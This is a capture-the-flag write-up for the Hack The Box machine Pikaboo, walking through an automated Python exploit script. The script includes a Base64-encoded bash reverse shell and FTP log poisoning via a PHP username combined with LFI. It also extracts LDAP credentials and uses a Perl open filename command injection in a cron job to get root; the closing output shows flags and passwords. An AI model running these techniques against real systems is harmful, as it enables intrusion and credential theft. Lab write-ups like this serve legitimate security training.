# Hack The Box. Machines. Pikaboo

Machine write-up: https://7rocky.github.io/en/htb/pikaboo

### `autopwn.py`

This is a Python _script_ that automates all the steps needed to compromise the machine. These are the steps:

- Log poisoning
- Shell as `www-data`
- System enumeration
- LDAP enumeration to get `pwnmeow`'s FTP password
- Store malicious file via FTP for command injection
- Shell as `root`

All these steps can be followed in the main function:

```python
def main():
    ftp = FTP(rhost)

    rev_shell = f'bash -i  >& /dev/tcp/{lhost}/{lport} 0>&1'.encode()
    command = f'echo {b64e(rev_shell)} | base64 -d | bash'

    shell = log_poisoning(ftp, command)
    user = user_enum(shell)
    ldap_user, ldap_password = ldap_enum(shell)

    log.info(f'Found LDAP user: {ldap_user}')
    log.info(f'Found LDAP password: {ldap_password}')

    ftp_password = ldap_search(shell, user, ldap_user, ldap_password)

    log.info(f'Found FTP password: {ftp_password}')

    shell = command_injection(ftp, user, ftp_password, command)
    root_flag(shell)

    log.success('Got shell as root')
    shell.interactive(prompt='')
```

First we define the reverse shell command as a Bash command encoded in Base64. Something like his:

```console
$ echo -n 'bash  -i >& /dev/tcp/10.10.17.44/4444 0>&1' | base64 
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx
```

Then we use `log_poisoning` to obtain a shell as `www-data`:

```python
def log_poisoning(ftp, command: str):
    log_file = '/var/log/vsftpd.log'
    lfi_website = f'http://{rhost}/admin../admin_staging/index.php'
    log_poisoning_url = f'{lfi_website}?page={log_file}'

    try:
        ftp.login(f'<?php system("{command}"); ?>', 'asdf')
    except error_perm:
        log.info(f'FTP log ({log_file}) has been poisoned')
        sleep(5)

    Thread(target=requests.get, args=(log_poisoning_url, )).start()

    return listen_for_shell()
```

What it does is basically login to FTP with a username that contains PHP code, and then use an LFI vulnerability to include the FTP log file and execute the PHP code (which contains a system command with the reverse shell).

The function `listen_for_shell` does what its name says:

```python
def listen_for_shell(timeout: int = 20):
    shell = listen(lport, timeout=timeout).wait_for_connection()

    if shell.sock is None:
        log.error(f'Could not to connect to {rhost}')

    return shell
```

After obtaining a shell, we get the `pwnmeow` username and capture the `user.txt` flag:

```python
def user_enum(shell) -> str:
    shell.sendlineafter(b'$', b'ls /home')
    shell.recvline()
    user = shell.recvline().decode().strip()

    log.info(f'Found user: {user}')
    sleep(1)

    shell.sendline(f'cat /home/{user}/user.txt'.encode())
    shell.recvline()
    user_txt = shell.recvline().decode().strip()

    log.warning(f'Found user.txt: {user_txt}')
    sleep(1)

    return user
```

Then, we find some LDAP credentials in file `/opt/pokeapi/config/settings.py` (read the [write-up](https://7rocky.github.io/en/htb/pikaboo) for more information). We need to use some regular expressions to extract the desired values:

```python
def ldap_enum(shell) -> Tuple[str]:
    shell.sendline(b'cat /opt/pokeapi/config/settings.py')
    shell.recvuntil(b'DATABASE')
    settings = shell.recv(2048, timeout=2).decode()

    ldap_settings = re.findall(r'''
\s+"ldap": {
    \s+"ENGINE": ".*?",
    \s+"NAME": ".*?",
    \s+"USER": "(.*?)",
    \s+"PASSWORD": "(.*?)",
\s+}''', settings)

    ldap_user, ldap_password = ldap_settings[0]
    return ldap_user, ldap_password
```

Once we have credentials for LDAP, we can use `ldapsearch` command using the function `ldap_search` (again, read the [write-up](https://7rocky.github.io/en/htb/pikaboo) for more details). Regular expressions are needed too:

```python
def ldap_search(shell, user: str, ldap_user: str, ldap_password: str) -> str:
    base = 'dc=ftp,dc=pikaboo,dc=htb'
    ldapsearch = f"ldapsearch -xD {ldap_user} -w '{ldap_password}' -b {base}"

    shell.sendline(ldapsearch.encode())
    shell.recvuntil(user.encode())
    res = shell.recv(2048, timeout=2).decode()

    ftp_password_enc = re.findall(r'userPassword:: (.*?)$', res, re.MULTILINE)
    return b64d(ftp_password_enc[0]).decode()
```

Finally, we perform a command injection into a Cron task exploiting a Perl open argument injection vulnerability.

To make this action work, the file must be crafted in a singular way and uploaded to a directory inside `/srv/ftp`. And this task must be done using Python's `ftplib` library and instructions (find library documentation [here](https://docs.python.org/3/library/ftplib.html)).

To create the malicious file, a system command (namely, `os.system`) must be used to avoid errors. Afterwards, the file is removed with another system command.

```python
def command_injection(ftp, ftp_user: str, ftp_password: str, command: str):
    filename = f'|{command}|.csv'
    os.system(f"touch '{filename}'")

    ftp.login(ftp_user, ftp_password)

    dirs = []
    ftp.dir(dirs.append)
    directory = dirs[0].split()[-1]

    ftp.cwd(directory)

    ftp.storlines(f'STOR {filename}', open(filename))
    log.info('Stored malicious file with injected command in filename')

    os.system(f"rm '{filename}'")
    ftp.close()

    return listen_for_shell(timeout=120)
```

Additionally, we have another function to capture the `root.txt` flag:

```python
def root_flag(shell):
    shell.sendlineafter(b'#', b'cat /root/root.txt')
    shell.recvline()
    root_txt = shell.recvline().decode().strip()

    log.warning(f'Found root.txt: {root_txt}')
```

Finally, we can execute the _script_ and compromise the machine with just one click:

```console
$ python3 autopwn.py 10.10.17.44
[*] FTP log (/var/log/vsftpd.log) has been poisoned
[+] Trying to bind to :: on port 4444: Done
[+] Waiting for connections on :::4444: Got connection from ::ffff:10.10.10.249 on port 47390
[*] Found user: pwnmeow
[!] Found user.txt: f3417b113fe715a58e02f9e29fe6c736
[*] Found LDAP user: cn=binduser,ou=users,dc=pikaboo,dc=htb
[*] Found LDAP password: J~42%W?PFHl]g
[*] Found FTP password: _G0tT4_C4tcH_'3m_4lL!_
[*] Stored malicious file with injected command in filename
[+] Trying to bind to :: on port 4444: Done
[+] Waiting for connections on :::4444: Got connection from ::ffff:10.10.10.249 on port 47396
[!] Found root.txt: 3904cd5b02fd88be5264107d52282460
[+] Got shell as root
[*] Switching to interactive mode
root@pikaboo:/srv/ftp/abilities#
```
